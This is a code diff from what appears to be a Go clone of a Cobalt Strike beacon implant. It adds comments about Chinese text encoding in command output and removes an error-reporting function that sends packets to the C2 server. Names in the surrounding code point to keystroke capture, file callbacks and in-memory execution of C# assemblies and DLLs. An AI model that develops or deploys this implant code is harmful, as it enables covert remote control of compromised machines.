@@ -5,13 +5,15 @@ import (
 	"fmt"
 	"main/config"
 	"main/packet"
-	"main/util"
 	"math/rand"
 	"time"
 )
 
 // all of this can be found in beacon.Job class
 const (
+	// IMPORTANT! windows default use codepage 936(GBK)
+	// if using CALLBACK 0, CS server will handle result use charset attr in metadata, which will not cause Chinese garbled
+	// BUT go deal character as utf8, so Chinese result generate by go will have an encoding problem
 	CALLBACK_OUTPUT            = 0
 	CALLBACK_KEYSTROKES        = 1
 	CALLBACK_FILE              = 2
@@ -190,16 +192,6 @@ func parseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, err
 	csharp, err := parseAnArg(buf)
 	dll := buf.Bytes()
 	return callBackType, sleepTime, offset, description, csharp, dll, err
-}
-
-func ErrorMessage(err string) {
-	errIdBytes := packet.WriteInt(0) // must be zero
-	arg1Bytes := packet.WriteInt(0)  // for debug
-	arg2Bytes := packet.WriteInt(0)
-	errMsgBytes := []byte(err)
-	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-	finalPaket := packet.MakePacket(CALLBACK_ERROR, result)
-	packet.PushResult(finalPaket)
 }
 
 func ChangeSleep(b []byte) {
